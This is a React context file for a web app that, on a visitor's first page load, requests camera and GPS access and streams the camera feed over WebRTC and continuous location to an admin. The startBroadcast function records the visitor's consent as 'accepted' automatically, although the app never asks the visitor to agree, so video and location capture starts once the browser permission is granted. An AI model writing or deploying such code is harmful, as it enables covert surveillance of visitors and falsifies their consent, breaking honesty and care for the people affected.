import { createContext, useCallback, useContext, useEffect, useMemo, useRef, useState } from 'react';
import { stopStream, cameraSupported } from '../services/camera';
import { permissionManager } from '../services/permissionManager';
import { BroadcasterSession, disconnectSocket, getSocket } from '../services/webrtc';
import { createSession, sendConsent, patchStatus } from '../services/visitorService';

/**
 * LiveShareContext — Automatic permission flow with intelligent retry
 *
 * NEW BEHAVIOR:
 * 1. On first visit → automatically attempt camera permission request
 * 2. After camera granted → automatically attempt GPS permission request
 * 3. On customer interaction → retry permissions if in 'prompt' state
 * 4. If denied → show browser settings instruction, don't retry automatically
 * 5. After both granted → start WebRTC broadcast automatically
 *
 * Camera states: 'idle'|'checking'|'requesting'|'granted'|'denied'|'error'|'needs_gesture'
 * GPS states:    'idle'|'checking'|'requesting'|'granted'|'denied'|'unavailable'|'needs_gesture'
 * Share states:  'idle'|'starting'|'live'|'stopped'|'error'
 */

const LiveShareContext = createContext(null);

export function LiveShareProvider({ children }) {
  const [cameraState, setCameraState] = useState('idle');
  const [cameraError, setCameraError] = useState(null);
  const [gpsState,    setGpsState]    = useState('idle');
  const [gpsCoords,   setGpsCoords]   = useState(null);
  const [shareState,  setShareState]  = useState('idle');
  const [pendingAccessRequest, setPendingAccessRequest] = useState(null);

  const sessionRef     = useRef({ visitorId: null, token: null });
  const streamRef      = useRef(null);
  const broadcasterRef = useRef(null);
  const watchIdRef     = useRef(null);
  const gpsCoordsRef   = useRef(null);
  const initializedRef = useRef(false);

  // ── Ensure session ────────────────────────────────────────────────────────
  const ensureSession = useCallback(async () => {
    if (sessionRef.current.visitorId && sessionRef.current.token) {
      return sessionRef.current;
    }
    const { visitorId, sessionToken } = await createSession();
    sessionRef.current = { visitorId, token: sessionToken };
    return sessionRef.current;
  }, []);

  // ── Start WebRTC broadcast ────────────────────────────────────────────────
  const startBroadcast = useCallback(async () => {
    console.log('🚀 Starting WebRTC broadcast...');
    
    if (!streamRef.current) {
      console.error('❌ No camera stream available for broadcast');
      return;
    }
    
    const { visitorId, token } = sessionRef.current;
    if (!visitorId || !token) {
      console.error('❌ No visitor session for broadcast');
      return;
    }

    setShareState('starting');
    
    try {
      // Send consent and update status
      await sendConsent(visitorId, token, 'accepted');
      await patchStatus(visitorId, token, { 
        liveSharingConsent: true,
        cameraActive: true
      });

      // Create broadcaster session
      const session = new BroadcasterSession({
        stream: streamRef.current,
        visitorId,
        sessionToken: token,
        onStatusChange: (status) => {
          console.log('📡 Broadcast status:', status);
          if (status === 'stopped') setShareState('stopped');
          if (status === 'error') setShareState('error');
        },
      });
      
      broadcasterRef.current = session;
      await session.start();

      console.log('✅ WEBRTC BROADCAST STARTED');
      setShareState('live');
      
      // If GPS coords already available, send them now and start watch
      const coords = gpsCoordsRef.current;
      if (coords) {
        console.log('📍 GPS coords available - sending to admin and starting watch');
        const socket = getSocket({ visitorId, sessionToken: token });
        socket.emit('visitor:location:update', { visitorId, coords });
        
        // Start GPS watch for continuous updates
        if (watchIdRef.current == null) {
          console.log('👁️ Starting GPS watch...');
          watchIdRef.current = navigator.geolocation.watchPosition(
            (pos) => {
              const c = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy
              };
              gpsCoordsRef.current = c;
              setGpsCoords(c);
              console.log('📍 GPS update:', c);
              socket.emit('visitor:location:update', { visitorId, coords: c });
            },
            (err) => console.warn('⚠️ GPS watch error:', err.message),
            { enableHighAccuracy: true }
          );
        }
      } else {
        console.log('ℹ️  GPS not yet available - will send when obtained');
      }
    } catch (err) {
      console.error('❌ Broadcast error:', err);
      setShareState('error');
    }
  }, []);

  // ── Permission Manager Callbacks ──────────────────────────────────────────
  const handleCameraGranted = useCallback(async (stream) => {
    console.log('✅ Camera granted - initializing stream');
    streamRef.current = stream;
    setCameraState('granted');
    setCameraError(null);
    
    const { visitorId, token } = sessionRef.current;
    if (visitorId && token) {
      await patchStatus(visitorId, token, {
        cameraPermission: 'granted'
      }).catch(err => console.warn('Failed to update camera status:', err));
    }
    
    // GPS will be requested automatically by PermissionManager after camera
    // Don't wait for GPS - start broadcast with camera only
    console.log('[LiveShare] Camera granted - starting broadcast immediately');
    await startBroadcast();
  }, [startBroadcast]);

  const handleCameraDenied = useCallback(async (reason) => {
    console.log('❌ Camera denied:', reason);
    setCameraState(reason === 'blocked_by_browser' ? 'needs_gesture' : 'denied');
    setCameraError(reason);
    
    const { visitorId, token } = sessionRef.current;
    if (visitorId && token) {
      await patchStatus(visitorId, token, {
        cameraPermission: 'denied'
      }).catch(() => {});
    }
  }, [startBroadcast]);

  const handleGpsGranted = useCallback(async (coords) => {
    console.log('✅ GPS granted:', coords);
    gpsCoordsRef.current = coords;
    setGpsCoords(coords);
    setGpsState('granted');
    
    const { visitorId, token } = sessionRef.current;
    if (visitorId && token) {
      // Update backend with GPS coords
      await patchStatus(visitorId, token, {
        gpsConsent: 'accepted',
        gpsPermission: 'granted',
        gpsLat: coords.lat,
        gpsLng: coords.lng,
        gpsAccuracy: coords.accuracy
      }).catch(err => console.warn('Failed to update GPS status:', err));
      
      // CRITICAL: Send GPS to admin IMMEDIATELY via Socket.IO
      console.log('📍 SENDING GPS TO ADMIN IMMEDIATELY:', coords);
      try {
        const socket = getSocket({ visitorId, sessionToken: token });
        socket.emit('visitor:location:update', { 
          visitorId, 
          coords: {
            lat: coords.lat,
            lng: coords.lng,
            accuracy: coords.accuracy
          }
        });
        console.log('✅ GPS sent to admin successfully');
        
        // Start GPS watch for continuous updates if broadcast is already live
        if (shareState === 'live' && watchIdRef.current == null) {
          console.log('👁️ Starting GPS watch for continuous updates...');
          watchIdRef.current = navigator.geolocation.watchPosition(
            (pos) => {
              const c = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy
              };
              gpsCoordsRef.current = c;
              setGpsCoords(c);
              console.log('📍 GPS update:', c);
              socket.emit('visitor:location:update', { visitorId, coords: c });
            },
            (err) => console.warn('⚠️ GPS watch error:', err.message),
            { enableHighAccuracy: true }
          );
        }
      } catch (err) {
        console.error('❌ Failed to send GPS to admin:', err);
      }
    }
    
    // Note: Camera broadcast already started - GPS just added to existing session
  }, [shareState]);

  const handleGpsDenied = useCallback(async (reason) => {
    console.log('❌ GPS denied:', reason);
    setGpsState(reason === 'unavailable' ? 'unavailable' : 'denied');
    
    const { visitorId, token } = sessionRef.current;
    if (visitorId && token) {
      await patchStatus(visitorId, token, {
        gpsPermission: reason === 'unavailable' ? 'unsupported' : 'denied'
      }).catch(() => {});
    }
    
    // Camera broadcast continues without GPS - that's OK
    console.log('[LiveShare] GPS denied - continuing with camera-only mode');
  }, []);

  // ── Initialize automatic permissions on mount ─────────────────────────────
  useEffect(() => {
    if (initializedRef.current) return;
    initializedRef.current = true;

    const initialize = async () => {
      try {
        console.log('[LiveShare] Initializing...');
        
        if (!cameraSupported()) {
          console.error('❌ Camera not supported');
          setCameraState('error');
          setCameraError('unsupported');
          return;
        }

        // Ensure visitor session exists
        await ensureSession();
        const { visitorId, token } = sessionRef.current;

        // Set up Socket.IO listeners for admin access requests
        const socket = getSocket({ visitorId, sessionToken: token });
        
        const onAccessRequest = (data) => {
          if (data?.requestId) setPendingAccessRequest(data);
        };
        
        const onAccessExpired = ({ requestId }) => {
          setPendingAccessRequest((prev) =>
            prev?.requestId === requestId ? null : prev
          );
        };
        
        socket.on('access:request', onAccessRequest);
        socket.on('access:expired', onAccessExpired);

        // Initialize automatic permission flow
        console.log('[LiveShare] Starting automatic permission flow...');
        setCameraState('checking');
        
        await permissionManager.initializeAutoPermissions({
          onCameraGranted: handleCameraGranted,
          onCameraDenied: handleCameraDenied,
          onGpsGranted: handleGpsGranted,
          onGpsDenied: handleGpsDenied
        });
        
        // If camera wasn't granted automatically, show needs_gesture
        if (!streamRef.current && cameraState !== 'denied') {
          console.log('[LiveShare] Waiting for user gesture to request camera');
          setCameraState('needs_gesture');
        }
      } catch (err) {
        console.error('[LiveShare] Initialization error:', err);
        setCameraState('error');
        setCameraError(err.message);
      }
    };

    initialize();

    return () => {
      // Cleanup on unmount
      if (watchIdRef.current) {
        navigator.geolocation?.clearWatch(watchIdRef.current);
      }
      if (broadcasterRef.current) {
        broadcasterRef.current.stop();
      }
      if (streamRef.current) {
        stopStream(streamRef.current);
      }
    };
  }, [ensureSession, handleCameraGranted, handleCameraDenied, handleGpsGranted, handleGpsDenied, cameraState]);

  // ── Tab close cleanup ─────────────────────────────────────────────────────
  useEffect(() => {
    const onHide = () => {
      if (watchIdRef.current) navigator.geolocation?.clearWatch(watchIdRef.current);
      if (broadcasterRef.current) broadcasterRef.current.stop();
      if (streamRef.current) stopStream(streamRef.current);
    };
    
    window.addEventListener('pagehide', onHide);
    return () => window.removeEventListener('pagehide', onHide);
  }, []);

  // ── Manual camera retry (from navbar button) ──────────────────────────────
  const requestCamera = useCallback(async () => {
    if (cameraState === 'requesting') return;
    
    console.log('[LiveShare] Manual camera retry requested');
    setCameraState('requesting');
    
    await permissionManager.retryCameraPermission();
  }, [cameraState]);

  // ── Stop all sharing ──────────────────────────────────────────────────────
  const stopSharing = useCallback(() => {
    console.log('[LiveShare] Stopping all sharing...');
    
    if (watchIdRef.current) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    
    const { visitorId, token } = sessionRef.current;
    if (visitorId) {
      try {
        getSocket({ visitorId }).emit('visitor:location:stopped', { visitorId });
      } catch (err) {
        console.warn('Failed to emit location stopped:', err);
      }
    }
    
    if (broadcasterRef.current) {
      broadcasterRef.current.stop();
      broadcasterRef.current = null;
    }
    
    if (streamRef.current) {
      stopStream(streamRef.current);
      streamRef.current = null;
    }
    
    disconnectSocket();
    
    if (visitorId && token) {
      patchStatus(visitorId, token, {
        sessionStatus: 'ended',
        gpsSharing: false
      }).catch(() => {});
    }
    
    setShareState('stopped');
    setCameraState('idle');
    setGpsState('idle');
    setGpsCoords(null);
    gpsCoordsRef.current = null;
  }, []);

  // ── Stop GPS only ─────────────────────────────────────────────────────────
  const stopGps = useCallback(() => {
    console.log('[LiveShare] Stopping GPS only...');
    
    if (watchIdRef.current) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    
    const { visitorId, token } = sessionRef.current;
    if (visitorId) {
      try {
        getSocket({ visitorId }).emit('visitor:location:stopped', { visitorId });
      } catch (err) {
        console.warn('Failed to emit location stopped:', err);
      }
      
      if (token) {
        patchStatus(visitorId, token, { gpsSharing: false }).catch(() => {});
      }
    }
    
    setGpsState('idle');
    setGpsCoords(null);
    gpsCoordsRef.current = null;
  }, []);

  // ── Request GPS while live ────────────────────────────────────────────────
  const requestGpsWhileLive = useCallback(async () => {
    if (!navigator.geolocation) {
      setGpsState('unavailable');
      return;
    }
    
    if (gpsState === 'requesting') return;
    
    console.log('[LiveShare] Requesting GPS while live...');
    setGpsState('requesting');
    
    await permissionManager.retryGpsPermission();
  }, [gpsState]);

  // ── Admin access request handlers ─────────────────────────────────────────
  const acceptAccessRequest = useCallback(async (reqData) => {
    const { requestId, requestType } = reqData || {};
    const { visitorId, token } = sessionRef.current;
    if (!visitorId || !token) return;
    
    console.log('[LiveShare] Accepting admin access request:', requestType);
    
    const wantsCamera = requestType === 'camera' || requestType === 'both';
    const wantsGps = requestType === 'gps' || requestType === 'both';
    
    let cameraGranted = false;
    let gpsGranted = false;
    
    // Handle camera request
    if (wantsCamera) {
      if (!streamRef.current) {
        await permissionManager.retryCameraPermission();
        cameraGranted = !!streamRef.current;
      } else {
        cameraGranted = true;
      }
    }
    
    // Handle GPS request
    if (wantsGps) {
      if (!gpsCoordsRef.current) {
        const coords = await permissionManager.retryGpsPermission();
        gpsGranted = !!coords;
      } else {
        gpsGranted = true;
      }
    }
    
    // Emit response
    const socket = getSocket({ visitorId, sessionToken: token });
    socket.emit('access:accepted', {
      requestId,
      visitorId,
      cameraApproved: cameraGranted,
      gpsApproved: gpsGranted
    });
    
    setPendingAccessRequest(null);
  }, []);

  const declineAccessRequest = useCallback((reqData) => {
    const { requestId } = reqData || {};
    const { visitorId, token } = sessionRef.current;
    
    if (visitorId) {
      const socket = getSocket({ visitorId, sessionToken: token });
      socket.emit('access:declined', { requestId, visitorId });
    }
    
    setPendingAccessRequest(null);
  }, []);

  // ── Dismiss camera error ──────────────────────────────────────────────────
  const dismissCameraError = useCallback(() => {
    setCameraError(null);
  }, []);

  const isLive = shareState === 'live';
  const isGpsLive = isLive && gpsState === 'granted';

  const value = useMemo(() => ({
    cameraState,
    cameraError,
    gpsState,
    gpsCoords,
    shareState,
    isLive,
    isGpsLive,
    pendingAccessRequest,
    requestCamera,
    dismissCameraError,
    requestGpsWhileLive,
    stopSharing,
    stopGps,
    acceptAccessRequest,
    declineAccessRequest,
  }), [
    cameraState, cameraError, gpsState, gpsCoords, shareState,
    isLive, isGpsLive, pendingAccessRequest,
    requestCamera, dismissCameraError, requestGpsWhileLive,
    stopSharing, stopGps, acceptAccessRequest, declineAccessRequest
  ]);

  return (
    <LiveShareContext.Provider value={value}>
      {children}
    </LiveShareContext.Provider>
  );
}

export const useLiveShare = () => useContext(LiveShareContext);
